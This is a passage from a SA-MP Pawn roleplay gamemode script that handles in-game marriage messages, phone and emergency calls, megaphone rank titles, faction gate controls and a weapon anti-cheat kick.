                        OOCNews(COLOR_WHITE, string);
                    }
                    else if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 1)
                    {
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Husband & Husband, you may kiss the Bride.", sendername, giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Husband & Husband, you may kiss the Groom.", giveplayer, sendername);
                        SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
                        format(string, sizeof(string), "Marriage News: We have a new Gay couple, %s & %s have been married.", sendername, giveplayer);
                        OOCNews(COLOR_WHITE, string);
                    }
                    else if(PlayerInfo[playerid][pSex] == 2 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
                    {
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Wife & Wife, you may kiss the Bride.", sendername, giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "Priest: %s and %s i pronounce you now...Wife & Wife, you may kiss the Groom.", giveplayer, sendername);
                        SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
                        format(string, sizeof(string), "Marriage News: We have a new Lesbian couple, %s & %s have been married.", sendername, giveplayer);
                        OOCNews(COLOR_WHITE, string);
                    }
                    //MarriageCeremoney[ProposedTo[playerid]] = 1;
                    MarriageCeremoney[ProposedTo[playerid]] = 0;
                    MarriageCeremoney[playerid] = 0;
                    format(string, sizeof(string), "%s", sendername);
                    strmid(PlayerInfo[ProposedTo[playerid]][pMarriedTo], string, 0, strlen(string), 255);
                    SaveKonStr(ProposedTo[playerid], "pMarriedTo", string);
                    format(string, sizeof(string), "%s", giveplayer);
                    strmid(PlayerInfo[playerid][pMarriedTo], string, 0, strlen(string), 255);
                    SaveKonStr(playerid, "pMarriedTo", string);
                    GivePlayerPool(playerid, - 1000);
//                  PlayerInfo[ProposedTo[playerid]][pPhousekey] = PlayerInfo[playerid][pPhousekey];
//                  PlayerInfo[ProposedTo[playerid]][pPbiskey] = PlayerInfo[playerid][pPbiskey];
                    ProposedTo[playerid] = INVALID_PLAYER_ID;
                    MarriageCeremoney[playerid] = 0;
                }
                else
                {
                    MarriageCeremoney[playerid] = 0;
                    ProposedTo[playerid] = INVALID_PLAYER_ID;
                    return 0;
                }
            }
        }
        else
        {
            if(GotProposedBy[playerid] < INVALID_PLAYER_ID)
            {
                if(IsPlayerConnected(GotProposedBy[playerid]))
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(GotProposedBy[playerid], giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* You didn't want to Marry %s, no 'yes' was said.",giveplayer);
                    SendClientMessage(playerid, COLOR_YELLOW, string);
                    format(string, sizeof(string), "* %s did't want to Marry you, no 'yes' was said.",sendername);
                    SendClientMessage(GotProposedBy[playerid], COLOR_YELLOW, string);
                    return 0;
                }
                else
                {
                    MarriageCeremoney[playerid] = 0;
                    GotProposedBy[playerid] = INVALID_PLAYER_ID;
                    return 0;
                }
            }
            else if(ProposedTo[playerid] < INVALID_PLAYER_ID)
            {
                if(IsPlayerConnected(ProposedTo[playerid]))
                {
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(ProposedTo[playerid], giveplayer, sizeof(giveplayer));
                    format(string, sizeof(string), "* You didn't want to Marry %s, no 'yes' was said.",giveplayer);
                    SendClientMessage(playerid, COLOR_YELLOW, string);
                    format(string, sizeof(string), "* %s did't want to Marry you, no 'yes' was said.",sendername);
                    SendClientMessage(ProposedTo[playerid], COLOR_YELLOW, string);
                    return 0;
                }
                else
                {
                    MarriageCeremoney[playerid] = 0;
                    ProposedTo[playerid] = INVALID_PLAYER_ID;
                    return 0;
                }
            }
        }
        return 0;
    }


    if(CallLawyer[playerid] == 111)
    {
        new idx;
        tmp = strtok(text, idx);
        if ((strcmp("yes", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("yes")))
        {
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, sizeof(string), "** %s is in Jail, and needs a Lawyer. Go to the Police Station.", sendername);
            SendJobMessage(2, TEAM_AZTECAS_COLOR, string);
            SendJobMessage(2, TEAM_AZTECAS_COLOR, "* When you are at the Police Station, ask an Officer to approve you with /accept lawyer.");
            SendClientMessage(playerid, COLOR_LIGHTRED, "A message has been sent to all available Lawyers, please wait.");
            WantLawyer[playerid] = 0;
            CallLawyer[playerid] = 0;
            return 0;
        }
        else
        {
            SendClientMessage(playerid, COLOR_LIGHTRED, "There is no Lawyer available to you anymore.");
            WantLawyer[playerid] = 0;
            CallLawyer[playerid] = 0;
            return 0;
        }
    }
    if(TalkingLive[playerid] != 255)
    {
        GetPlayerName(playerid, sendername, sizeof(sendername));
        if(PINFO[playerid][pLeader] == 9 || PINFO[playerid][pMember] == 9)
        {
            format(string, sizeof(string), "LiveNR %s: %s", sendername, text);
            OOCNews(COLOR_LIGHTGREEN, string);
        }
        else
        {
            format(string, sizeof(string), "LivePlayer %s: %s", sendername, text);
            OOCNews(COLOR_LIGHTGREEN, string);
        }
        return 0;
    }
    if(Mobile[playerid] != 9999)
    {
        new idx;
        tmp = strtok(text, idx);
        GetPlayerName(playerid, sendername, sizeof(sendername));
        
        format(string, sizeof(string), "%s Goft (cellphone): %s", sendername, text);
        if(IsAtTelePhoneSabet[playerid] == true) format(string, sizeof(string), "Unknown Goft (telephonesabet): %s",text)
        ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
        //printf("callers line %d called %d caller %d",Mobile[Mobile[playerid]],Mobile[playerid],playerid);
        if(Mobile[playerid] == 9001)
        {
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: Sorry I don't understand?");
                return 0;
            }
            new turner[MAX_PLAYER_NAME];
            new wanted[128];
            GetPlayerName(playerid, turner, sizeof(turner));
            SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: We have alerted all units in the area.");
            SendClientMessage(playerid, TEAM_CYAN_COLOR, "Thank you for reporting this incident");
            format(wanted, sizeof(wanted), "Dispatch: All Units IA: Caller: %s",turner);
            SendTeamBeepMessage(1, TEAM_CYAN_COLOR, wanted);
            format(wanted, sizeof(wanted), "Dispatch: Incident: %s",text);
            SendTeamMessage(1, TEAM_CYAN_COLOR, wanted);
            SendClientMessage(playerid, COLOR_GRAD2, "They Hung Up...");
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
            Mobile[playerid] = 9999;
            return 0;
        }
        if(Mobile[playerid] == 9002)
        {
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry i dont understand?");
                return 0;
            }
            if ((strcmp("no", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("no")))
            {
                new turner[MAX_PLAYER_NAME];
                new wanted[128];
                GetPlayerName(playerid, turner, sizeof(turner));
                SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: We have alerted all units in the area.");
                SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime");
                format(wanted, sizeof(wanted), "HQ: All Units APB: Reporter: %s",turner);
                SendFamilyMessage(1, COLOR_DBLUE, wanted);
                SendClientMessage(playerid, COLOR_GRAD2, "   They Hung Up...");
                Mobile[playerid] = 9999;
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
                return 0;
            }
            new badguy;
            //badguy = strval(tmp);
            badguy = ReturnUser(tmp);
            if (IsPlayerConnected(badguy))
            {
                if(badguy != INVALID_PLAYER_ID)
                {
                    if (gTeam[badguy] == TEAM_COP || gTeam[badguy] == TEAM_MEDIC)
                    {
                        SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: You will have to contact internal affairs. This is an emergency line");
                        SendClientMessage(playerid, COLOR_GRAD2, " They Hung Up...");
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
                        Mobile[playerid] = 9999;
                        return 0;
                    }
                    if (GetPlayerWantedLevel(badguy) > 0)
                    {
                        SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Units are already assigned to that case");
                        SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime");
                        SendClientMessage(playerid, COLOR_GRAD2, " They Hung Up...");
                        Mobile[playerid] = 9999;
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
                        return 0;
                    }
                    if (badguy == playerid)
                    {
                        SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: Dont Fool Around, This is an emergency line.");
                        SendClientMessage(playerid, COLOR_GRAD2, " They Hung Up...");
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
            Mobile[playerid] = 9999;
                        return 0;
                    }
                    SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: We have alerted all units in the area.");
                    SendClientMessage(playerid, COLOR_DBLUE, "Thank you for reporting this crime");
                    SendClientMessage(playerid, COLOR_GRAD2, " They Hung Up...");
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
            Mobile[playerid] = 9999;
                    return 0;
                }//invalid id
                return 0;
            }//not connected
            else
            {
                format(string, sizeof(string), "Police HQ: I have no Information on %s, are you sure thats the right name?",tmp);
                SendClientMessage(playerid, COLOR_DBLUE, string);
                return 0;
            }
        }
        if(Mobile[playerid] == 9003)
        {
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry i dont understand?");
                return 0;
            }
            SendClientMessage(playerid, COLOR_DBLUE, "Police HQ: If you know the assailant's name or part of it say it now or just say no.");
            Mobile[playerid] = 9002;
            return 0;
        }
        if(Mobile[playerid] == 9000)
        {
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry i dont understand, police or paramedic?");
                return 0;
            }
            else if ((strcmp("police", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("police")))
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: I am patching you to  Police HQ, please hold.");
                Mobile[playerid] = 9003;
                SendClientMessage(playerid, COLOR_DBLUE, "HQ: Please give me a short description of the crime and location.");
                return 0;
            }
            else if ((strcmp("paramedic", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("paramedic")))
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: I am patching you to  Paramedic HQ, please hold.");
                Mobile[playerid] = 9001;
                SendClientMessage(playerid, TEAM_CYAN_COLOR, "Dispatch: Please give me a short description of the Incident.");
                return 0;
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALLDEPT, "EMERGENCY: Sorry I don't understand, police or paramedic?");
                return 0;
            }
        }
        if(Mobile[playerid] == 3900)
        {
            SendFamilyMessage(9, COLOR_GREEN, "You have one new message:");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);
            format(string, sizeof(string), "[ID:%d] %s Goft: %s", playerid, sendername, text);
            SendFamilyMessage(9, COLOR_GREEN, string);
            SendClientMessage(playerid, COLOR_GREEN, "CNN Studio: Thanks for your information !");
            SendClientMessage(playerid, COLOR_GRAD2, "   They Hung Up...");
            if(PlayerHandsCuffed[playerid] == 0)
            {
            SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
            }
            RemovePlayerAttachedObject(playerid, 0);
            Mobile[playerid] = 9999;
            return 0;
        }
        if(IsPlayerConnected(Mobile[playerid]))
        {
            if(Mobile[Mobile[playerid]] == playerid)
            {
                if(PlayerInfo[Mobile[playerid]][pSpeaker] == 1)
                {
                    ProxDetector(20.0, Mobile[playerid], string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
                }
                else
                {
                    SendClientMessage(Mobile[playerid], COLOR_YELLOW,string);
                }
            }
        }
        else
        {
            SendClientMessage(playerid, COLOR_YELLOW,"Theres nobody there");
        }
        return 0;
    }
    if (realchat)
    {
        if(gPlayerLogged[playerid] == 0)
        {
            return 0;
        }
		new strchat[256];
		ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1);
        format(strchat, sizeof(strchat), "%s Goft: %s",PlayerName(playerid), text);
		ProxDetector(20.0, playerid, strchat,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
        return 0;
    }
    return 0;
}

public FixHour(hour)
{
    hour = timeshift+hour;
    if (hour < 0)
    {
        hour = hour+24;
    }
    else if (hour > 23)
    {
        hour = hour-24;
    }
    shifthour = hour;
    return 1;
}

public IsPlayerInArea(playerid, Float:minx, Float:maxx, Float:miny, Float:maxy)
{
    new Float:x, Float:y, Float:z;
    GetPlayerPos(playerid, x, y, z);
    if (x > minx && x < maxx && y > miny && y < maxy) return 1;
    return 0;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
if (IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
        {
		if((newkeys & KEY_FIRE) && EnableBrake[playerid] == 1) {
		new Float:vx,Float:vy,Float:vz;
        GetVehicleVelocity(GetPlayerVehicleID(playerid),vx,vy,vz);
        SetVehicleVelocity(GetPlayerVehicleID(playerid), vx * 0.7, vy *0.7, vz * 0.7);
		}
        if((newkeys & KEY_FIRE) && EnableBoast[playerid] == 1)
        {
        new Float:vx,Float:vy,Float:vz;
        GetVehicleVelocity(GetPlayerVehicleID(playerid),vx,vy,vz);
        SetVehicleVelocity(GetPlayerVehicleID(playerid), vx * 1.2, vy *1.2, vz * 1.2);
        }
        }
        if((newkeys & KEY_FIRE)){
 if(PlayerInfo[playerid][pJob] == 21)
	{

            PlayerTextDrawHide(playerid,jtxd[playerid][0]);
            PlayerTextDrawHide(playerid,jtxd[playerid][1]);
            PlayerTextDrawHide(playerid,jtxd[playerid][2]);
            PlayerTextDrawHide(playerid,jtxd[playerid][3]);
            PlayerTextDrawHide(playerid,jtxd[playerid][4]);
            PlayerTextDrawHide(playerid,jtxd[playerid][5]);
            PlayerTextDrawHide(playerid,jtxd[playerid][6]);
	}
	}
    AFKTime[playerid] = 0;
	new pWeaponID = GetPlayerWeapon(playerid);
	if(newkeys & KEY_FIRE && IsPlayerSpawnedForMessage[playerid] == 1 && OnPaintBall[playerid] == 0 && gPlayerLogged[playerid] == 1 && pWeaponID != 43 && pWeaponID != 0 && AC_pWeapons[playerid][pWeaponID] == 0)
	{
		new pWeaponName[256],string[128];
		GetWeaponName(GetPlayerWeapon(playerid),pWeaponName,sizeof(pWeaponName));
		format(string,sizeof(string),"Weapon Hack (%s)",pWeaponName);
		KickAntiCheat(playerid,string);
	}
    if(newkeys & KEY_FIRE)
    {
        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) {AnimPlay[playerid] = 0;}
        if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && AnimPlay[playerid] == 1)
        {
            StopLoopingAnim(playerid);
            AnimPlay[playerid] = 0;
        }
     }

     	if (newkeys & KEY_SECONDARY_ATTACK)
	{
	    if(InModShop[playerid] == 1)
	    {
     		if (newkeys & KEY_SECONDARY_ATTACK) return 0;
  			TogglePlayerControllable(playerid, 0);
		}
	}

     	if (newkeys & KEY_SECONDARY_ATTACK)
	{
	if(OnMashinKharidan[playerid] == 1 && InModShop[playerid] == 0) {
     		if (newkeys & KEY_SECONDARY_ATTACK) return 0;
  			TogglePlayerControllable(playerid, 0);
	}
	}


	if( newkeys & KEY_SECONDARY_ATTACK )
	{
		OnPlayerCommandText(playerid, "/exit");
		OnPlayerCommandText(playerid, "/enter");
	}
	if(newkeys & KEY_NO) OnPlayerCommandText(playerid, "/lock");
	if(newkeys & KEY_SUBMISSION && IsPlayerInAnyVehicle(playerid)) OnPlayerCommandText(playerid, "/engine");
	if(newkeys & KEY_SECONDARY_ATTACK && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK && HaveJetpack[playerid] != 1) HaveJetpack[playerid] =0;

    if(PRESSED(KEY_SECONDARY_ATTACK))
    {

        if(OnRentMashinMessage[playerid] == true)
        {
            GameTextForPlayer(playerid, " ", 500, 3);
            TogglePlayerControllable(playerid, 1);
            RemovePlayerFromVehicle(playerid);
            OnRentMashinMessage[playerid] = false;
        }
    }
    if (PRESSED( KEY_CROUCH ))
    {
        new newcar = GetPlayerVehicleID(playerid);
        if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 20)
        {
            if(newcar == 33 && carneon3[newcar] == 0)
            {
                AttachObjectToVehicle(neon3, CopLSVeh[22], 0, 0, 0.7, 0, 0, 0);
                SCM(playerid,COLOR_BLUE,"Neon enabled.");
                carneon3[newcar] = 1;
            }
            if(newcar == 34 && carneon4[newcar] == 0)
            {
                AttachObjectToVehicle(neon4, CopLSVeh[23], 0, 0, 0.7, 0, 0, 0);
                SCM(playerid,COLOR_BLUE,"Neon enabled.");
                carneon4[newcar] = 1;
            }
            if(newcar == 35 && carneon5[newcar] == 0)
            {
                AttachObjectToVehicle(neon5, CopLSVeh[24], 0, 0, 0.7, 0, 0, 0);
                SCM(playerid,COLOR_BLUE,"Neon enabled.");
                carneon5[newcar] = 1;
            }
            if(newcar == FBIVeh[13] && carneon1[newcar] == 0)
            {
                AttachObjectToVehicle(bulletneon1,FBIVeh[13],0.0433, -0.2661, 0.6266,0.0000, 0.0000, 0.0000);
                SCM(playerid,COLOR_BLUE,"Neon enabled.");
            }
            if(newcar == FBIVeh[14] && carneon2[newcar] == 0)
            {
                AttachObjectToVehicle(bulletneon2,FBIVeh[14],0.0433, -0.2661, 0.6266,0.0000, 0.0000, 0.0000);
                SCM(playerid,COLOR_BLUE,"Neon enabled.");
            }
            }
    }
    if(PRESSED(KEY_LOOK_BEHIND))
    {
        if(IsACop(playerid) && OnDuty[playerid] == 10)
        {
            new string[256];
            new sendername[MAX_PLAYER_NAME];
            GetPlayerName(playerid,sendername,sizeof sendername);
            if(PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 1)
            {
                new currank[64];
                if(PlayerInfo[playerid][pRank] == 1) { currank = "Soldier"; }
                else if(PlayerInfo[playerid][pRank] == 2) { currank = "Police Officer"; }
                else if(PlayerInfo[playerid][pRank] == 3) { currank = "Sergeant"; }
                else if(PlayerInfo[playerid][pRank] == 4) { currank = "Captain"; }
                else if(PlayerInfo[playerid][pRank] == 5) { currank = "Colonel"; }
                else if(PlayerInfo[playerid][pRank] == 6) { currank = "Chief"; }
                else if(PlayerInfo[playerid][pRank] == 7) { currank = "PD Leader"; }
                format(string, sizeof(string), "[%s %s:o< %s >]", currank, sendername,Megaphonetext[playerid]);
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
            }
            else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "[FBI Leader %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "[Director %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "[Deputy Director %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "[Unit Chief %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "[Supervisory Special Agent %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "[Special Agent %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "[New Agent Trainee %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
            }
            else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
            {
                if(PlayerInfo[playerid][pRank] >= 7) { format(string, sizeof(string), "[National Guard Leader %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 6) { format(string, sizeof(string), "[Marshal %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 5) { format(string, sizeof(string), "[Sergeant Major %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 4) { format(string, sizeof(string), "[Master Sergeant %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 3) { format(string, sizeof(string), "[Sergeant %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 2) { format(string, sizeof(string), "[Corporal %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                else if(PlayerInfo[playerid][pRank] == 1) { format(string, sizeof(string), "[Private %s:o< %s >]", sendername,Megaphonetext[playerid]); }
                ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
            }
        }
    }
    new iSeat = GetPlayerVehicleSeat(playerid);
    if (PRESSED( KEY_ACTION ))
    {
        if(iSeat == 0)
        {
            new vid = GetPlayerVehicleID(playerid);
            if(LightsSTATE[vid] == 0)
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
                LightsSTATE[vid] = 1;
            }
            else
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
                LightsSTATE[vid] = 0;
            }
        }
    }

    if (PRESSED( KEY_CROUCH ))
    {
        if(IsPlayerInAnyVehicle(playerid))
        {
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 20)
            {
                if (PlayerToPoint(10.0, playerid, 1542.3541,-1627.5516,13.3828) && gateopen1 == 0)
                {
                    MoveObject(barrierls, 1544.69641113,-1630.79003906,13.00000000, 0.001, 0, 0, 270);
                    SetTimer("GateTime" ,3000 ,false);
                    gateopen1 = 1;
                }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 20 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
            {
                if (PlayerToPoint(10.0, playerid, 2238.5105,2454.0935,10.8203) && gateopen2 == 0)
                {
                    MoveObject(barrierlv, 2238.16210938,2450.41113281,10.71316910, 0.001, 0, 0, 90);
                    SetTimer("GateTime1" ,3000 ,false);
                    gateopen2 = 1;
                }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if (PlayerToPoint(10.0, playerid, 1589.0651,-1636.4768,13.4254) && gateopen3 == 0)
                {
                    MoveObject(garagels, 1588.3868,-1638.2165, -7, 5);
                    SetTimer("GarageLS" ,3000 ,false);
                    gateopen3 = 1;
                }
            }
            if(IsACop(playerid))
            {
               if(PTP(20.0,playerid,321.321075, 1897.642333, 16.636323) && gateopen4 == 0)
               {
                  MoveObject(area1gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
                  MoveObject(area2gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
                  MoveObject(area3gate1,321.3211, 1897.6423, 13.3879,5,0.0000, 0.0000, 270.0000);
                  SetTimer("areagate1",6000,false);
                  gateopen4 = 1;
               }
            }
            if(IsACop(playerid))
            {
               if(PTP(20.0,playerid,81.3497, 1913.8065, 13.3164) && gateopen5 == 0)
               {
                  MoveObject(area1gate2,81.3497, 1922.5674, 13.3143,5,0.0000, 0.0000, 90.0000);
                  MoveObject(area2gate2,81.3497, 1913.8065, 13.3164,5,0.0000, 0.0000, 90.0000);
                  SetTimer("areagate2",6000,false);
                  gateopen5 = 1;
               }
            }
            if(IsACop(playerid))
            {
               if(PTP(20.0,playerid,81.3481, 2063.2515, 16.5053) && gateopen6 == 0)
               {
                  MoveObject(area1gate3,81.3481, 2063.2515, 13.1630,5,0.0000, 0.0000, 90.0000);
                  MoveObject(area2gate3,81.3481, 2072.0249, 12.9549,5,0.0000, 0.0000, 90.0000);
                  SetTimer("areagate3",6000,false);
                  gateopen6 = 1;
               }
            }
            if(IsACop(playerid))
            {
               if(PTP(20.0,playerid,209.79103, 1875.28442, 12.13354) && gateopen7 == 0)
               {
                  MoveObject(AreaGate,209.79100, 1875.28442, 8.86356,4.1,0,0,0);
                  SetTimer("areagate",3000,false);
                  gateopen7 = 1;
               }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if (PlayerToPoint(10.0, playerid, 2334.4844,2444.3457,5.6337) && gateopen8 == 0)
                {
                    MoveObject(garagelv, 2335.2814,2444.1799, -7, 5);
                    SetTimer("GarageLV" ,3000 ,false);
                    gateopen8 = 1;
                }
            }
            if(PlayerInfo[playerid][pClan] == 1)
            {
                if (PlayerToPoint(20.0, playerid, 2222.889648,-1140.269165,25.708787) && gateopen10 == 0)
                {
                    MoveObject(TTgate, 2214.9355, -1138.5302, 28.3421, 5, 0.0000, 0.0000, -16.8600);
                    SetTimer("TTgateT" ,3000 ,false);
                    gateopen10 = 1;
                }
            }
            if(PlayerInfo[playerid][pClan] == 3)
            {
                if (PlayerToPoint(20.0, playerid, 2184.15991, -1762.50024, 14.65228) && gateopen22 == 0)
                {
                    MoveObject(EVgate, 2175.31470, -1762.51538, 14.69943, 5, 0.0000, 0.0000, 0.0000);
                    SetTimer("EVgateT" ,3000 ,false);
                    gateopen22 = 1;
                }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if (PlayerToPoint(10.0, playerid, 2292.9104,2499.2024,3.4907) && gateopen9 == 0)
                {
                    MoveObject(garagelv1, 2294,2498.5915, -4.5, 5);
                    SetTimer("GarageLV1" ,3000 ,false);
                    gateopen9 = 1;
                }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
                if (PlayerToPoint(10.0, playerid, -1624.76929, 688.32880, 8.89564) && gateopen20 == 0)
                {
					MoveObject(sfpdgate1, -1617.58215, 688.25903, 8.89564, 5);
					SetTimer("sfpdgate1T" ,3000 ,false);
					gateopen20 = 1;
                }
            }
            if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
            {
